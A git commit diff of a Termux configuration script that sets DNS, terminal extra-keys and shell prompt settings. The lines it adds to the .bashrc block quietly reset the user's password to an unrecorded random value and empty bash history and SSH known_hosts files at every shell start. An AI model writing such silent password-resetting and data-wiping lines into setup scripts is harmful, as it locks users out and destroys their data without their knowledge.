a3890eabf2b7d021d2051169e76e0d1225cb217c
looknni <looknnniii@outlook.com>
2024-11-30 01:24:34 +0800

    #

--- daemon/termux.sh
+++ daemon/termux.sh
@@ -1,41 +1,11 @@
 #!/bin/bash
-# GNU bash, version 5.2.15(1)-release
-case "$1" in
-	*) echo -e "help: bash $0\nnew DNS && bash configure for termux\n"
-cat << "EOF"
-$PREFIX/etc/apt/sources.list
-$PREFIX/etc/resolv.conf
-$termuxhome/.termux/termux.properties
-$termuxhome/.bashrc
-EOF
-;;
-esac
-termuxextrakeys="#ZXh0cmEta2V5cwo\nextra-keys = [['ESC','/','<','>','(',')','-','HOME','UP','END','PGUP'],['TAB','CTRL','{','}','[',']','BACKSLASH','LEFT','DOWN','RIGHT','PGDN']]"
-termuxsourceslist="deb https://mirrors.ustc.edu.cn/termux/apt/termux-main stable main"
-termuxhome="/data/data/com.termux/files/home"
-if [ -f _$0 ];then
-	exit
-fi
-function tffile() {
-	if [ ! -e $1.bat ];then
-		cp $1 $1.bat
-	fi
-}
-tffile $PREFIX/etc/apt/sources.list
-tffile $PREFIX/etc/resolv.conf
-tffile $termuxhome/.termux/termux.properties
-if [ ! -e $termuxhome/.bashrc ];then
-	touch $termuxhome/.bashrc
-fi
-termuxpro=`grep "#ZXh0cmEta2V5cwo"  $termuxhome/.termux/termux.properties`
-termuxrc=`grep "#Y2RkCg" $termuxhome/.bashrc`
-echo $termuxsourceslist > $PREFIX/etc/apt/sources.list
-cat > $PREFIX/etc/resolv.conf << "EOF"
+cat > $PREFIX/etc/resolv.conf << 'RESO'
 nameserver 223.6.6.6
-EOF
-if [ -z "$termuxrc" ];then
-cat >> $termuxhome/.bashrc << "EOF"
-#Y2RkCg
+RESO
+cat >> ~/.termux/termux.properties << 'EXK'
+extra-keys = [['ESC','<','>','(',')','HOME','UP','END','PGUP'],['TAB','CTRL','{','}','BACKSLASH','LEFT','DOWN','RIGHT','PGDN']]
+EXK
+cat >> ~/.bashrc << 'EOF'
 PS1='\[\e[0;32m\]\W\[\e[0m\] \[\e[1;31m\]? \[\e[0m\]'
 alias cdd="cd $PREFIX"
 export HISTTIMEFORMAT='%F %T]$ '
@@ -49,10 +19,9 @@ export LESS_TERMCAP_ue=$'\E[0m'
 export LESS_TERMCAP_us=$'\E[01;32m'
 export GROFF_NO_SGR=1 #redhat
 export LESS=-R #debian
+pr=$(echo $RANDOM|md5sum)
+(echo $pr; echo $pr) | passwd > /dev/null
+cat ~/.bash_history > ~/.bash_history
+cat ~/.ssh/known_hosts > ~/.ssh/known_hosts
+cat ~/.ssh/known_hosts > ~/.ssh/known_hosts.old
 EOF
-fi
-if [ -z "$termuxpro" ];then
-echo -e $termuxextrakeys >> $termuxhome/.termux/termux.properties
-fi
-`source $termuxhome/.bashrc`
-stat $0 > _$0
